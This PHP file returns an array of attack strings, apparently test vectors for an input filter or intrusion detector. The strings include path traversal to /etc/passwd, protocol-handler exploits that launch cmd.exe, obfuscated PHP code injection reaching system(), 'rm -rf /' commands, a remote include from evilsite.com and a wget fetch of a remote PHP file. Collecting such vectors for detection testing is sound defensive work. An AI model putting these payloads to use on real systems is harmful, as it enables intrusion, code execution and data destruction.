<?php
$exploits = array();
$exploits[]= '../../etc/passwd';
$exploits[]= '\%windir%\cmd.exe';
$exploits[]= '\..\..\..';
$exploits[]= '1;cat /e*c/p*d';
$exploits[]= '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00';
$exploits[]= '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd';
//$exploits[]= '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini';
$exploits[]= 'C:\boot.ini';
$exploits[]= '../../../../../../../../../../../../localstart.asp%00';
$exploits[]= '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini';
$exploits[] = '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;';
$exploits[] = '../../../../../../../../conf/server.xml';
$exploits[] = '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd';
//$exploits[] = 'dir/..././..././folder/file.php ';

$exploits[] = 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt';
$exploits[] = 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"';
$exploits[] = 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"';
$exploits[] = 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)';
$exploits[] = 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210';
$exploits[] = 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat';
$exploits[] = 'javasc&#x01;ript:alert(1)';

$exploits[] = ';phpinfo()';
$exploits[] = '@phpinfo()';
$exploits[] = '"; <?php exec("rm -rf /"); ?>';
$exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';
$exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
$exploits[] = '; include "http://evilsite.com/evilcode"';
$exploits[] = '; rm -rf /\0';
$exploits[] = '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="';
$exploits[] = '";
define ( _a, "0008avwga000934mm40re8n5n3aahgqvaga0a303") ;
if ( !0) $c = USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC ^ _a;
if ( !0) system($c) ;//';
$exploits[] = '" ; //
if (!0) $_a ="". str_rot13(\'cevags\'); //
$_b = HTTP_USER_AGENT; //
$_c="". $_SERVER[$_b]; //
$_a( `$_c` );//';
$exploits[] = '"; //
$_c = "" . $_a($b);
$_b(`$_c`);//';
$exploits[] = '" ; //
if (!0) $_a = base64_decode ;
if (!0) $_b = parse_str ; //
$_c = "" . strrev("ftnirp");
if (!0) $_d = QUERY_STRING; //
$_e= "" . $_SERVER[$_d];
$_b($_e); //
$_f = "" . $_a($b);
$_c(`$_f`);//';
$exploits[] = '" ; //
$_y = "" . strrev("ftnirp");
if (!0) $_a = base64_decode ;
if (!0) $_b="" . $_a(\'cHdk\');
if (!0) $_y(`$_b`);//';
$exploits[] = '";{ if (true) $_a = "" . str_replace(\'!\',\'\',\'s!y!s!t!e!m!\');
$_a( "dir"); } //';
$exploits[] = '";{ if (true) $_a = "" . strtolower("pass");
if (1) $_a.= "" . strtolower("thru");
$_a( "dir"); } //';
$exploits[] = '";{if (!($_b[]++%1)) $_a[] = system;
$_a[0]( "ls"); } //';
$exploits[] = '";{if (pi) $_a[] = system;
$_a[0]( "ls"); } //';
$exploits[] = '";; //
if (!($_b[] %1)) $_a[0] = system;
$_a[0](!a. "ls"); //';
$exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
$exploits[] = 'aaaa { $ {`wget http://example.com/x.php`}}';




return $exploits;